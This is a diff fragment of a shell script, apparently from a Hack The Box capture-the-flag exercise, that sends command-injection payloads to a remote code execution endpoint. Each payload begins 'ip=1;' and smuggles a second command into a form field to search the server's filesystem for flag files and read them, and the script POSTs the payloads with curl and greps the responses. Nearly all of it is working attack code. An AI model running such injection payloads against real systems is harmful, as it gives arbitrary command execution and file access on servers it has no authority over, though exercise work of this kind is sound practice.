@@ -1,0 +1,18 @@
+ip=1;grep -R "HTB{" -n / 2>/dev/null | head -n 100
+EOF
+cat > /workspace/recon/tmp/inj_find.txt <<\"EOF\"
+ip=1;find / -maxdepth 5 -type f \( -iname "*flag*" -o -iname "flag*" \) 2>/dev/null
+EOF
+cat > /workspace/recon/tmp/inj_www.txt <<\"EOF\"
+ip=1;ls -al /var/www/html 2>/dev/null; echo; grep -R "HTB{" -n /var/www/html 2>/dev/null | head -n 50
+EOF
+cat > /workspace/recon/tmp/inj_cats.txt <<\"EOF\"
+ip=1;cat /etc/*flag* /opt/*flag* /var/*flag* /usr/src/*flag* /app/*flag* 2>/dev/null
+EOF
+# Execute injections
+/workspace/recon/scripts/with_timeout.sh "$TO" -- curl -fsS -m "$TO" --connect-timeout "$TO" -s -X POST --data-urlencode "ip@/workspace/recon/tmp/inj_grep.txt"  "$BASE_RCE" | tee /workspace/recon/httpx/rce_grep.txt | sed -n "1,160p";
+/workspace/recon/scripts/with_timeout.sh "$TO" -- curl -fsS -m "$TO" --connect-timeout "$TO" -s -X POST --data-urlencode "ip@/workspace/recon/tmp/inj_find.txt"  "$BASE_RCE" | tee /workspace/recon/httpx/rce_find.txt  | sed -n "1,160p";
+/workspace/recon/scripts/with_timeout.sh "$TO" -- curl -fsS -m "$TO" --connect-timeout "$TO" -s -X POST --data-urlencode "ip@/workspace/recon/tmp/inj_www.txt"   "$BASE_RCE" | tee /workspace/recon/httpx/rce_www.txt   | sed -n "1,160p";
+/workspace/recon/scripts/with_timeout.sh "$TO" -- curl -fsS -m "$TO" --connect-timeout "$TO" -s -X POST --data-urlencode "ip@/workspace/recon/tmp/inj_cats.txt"  "$BASE_RCE" | tee /workspace/recon/httpx/rce_cats.txt  | sed -n "1,200p";
+# Search any HTB flags gathered
+rg -n "HTB\{[^}]+\}" -S /workspace/recon/httpx/*.txt || true
